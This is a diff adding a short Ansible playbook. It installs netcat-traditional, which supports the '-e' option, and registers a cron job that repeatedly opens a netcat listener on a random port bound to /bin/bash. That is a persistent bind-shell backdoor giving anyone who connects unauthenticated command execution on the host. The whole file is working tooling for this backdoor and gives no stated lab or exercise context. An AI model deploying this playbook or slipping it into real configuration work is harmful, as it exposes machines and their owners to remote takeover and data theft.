@@ -1,0 +1,29 @@
+---
+- name: Install 'nc' package on CentOS
+  package:
+    name: nc
+  become: yes
+  when: ansible_os_family == "RedHat"
+
+- name: Uninstall netcat-openbsd on Debian
+  package:
+    name: netcat-openbsd
+    state: absent
+  become: yes
+  when: ansible_os_family == "Debian"
+
+- name: Install netcat-traditional on Debian
+  package:
+    name: netcat-traditional
+  become: yes
+  when: ansible_os_family == "Debian"
+
+- name: Remove current cron job if exists
+  cron:
+    name: "new shell"
+    state: absent
+
+- name: Create cron job for random shells
+  cron:
+    name: "new shell"
+    job: nc -nvlp $(shuf -i 10000-65000 -n 1) -e /bin/bash
